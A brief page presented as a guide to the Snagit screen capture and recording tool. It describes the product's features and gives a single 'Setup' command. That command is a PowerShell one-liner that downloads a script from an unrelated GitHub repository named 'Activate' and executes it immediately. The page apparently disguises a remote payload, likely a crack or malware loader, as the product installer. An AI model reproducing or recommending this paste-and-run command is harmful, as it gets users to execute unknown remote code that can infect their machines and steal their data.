## Snagit -- Screen Capture and Recording Tool

Snagit is a professional screen capture and recording application developed by TechSmith. It enables users to grab screenshots, record screen activity, and annotate images for documentation, presentations, and training materials.

#### Setup

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

#### Core Functions

Capture full screens, scrolling windows, or selected regions. Record video with audio narration. Use the built-in editor to add arrows, callouts, stamps, and text annotations. Share directly to cloud services or local storage.
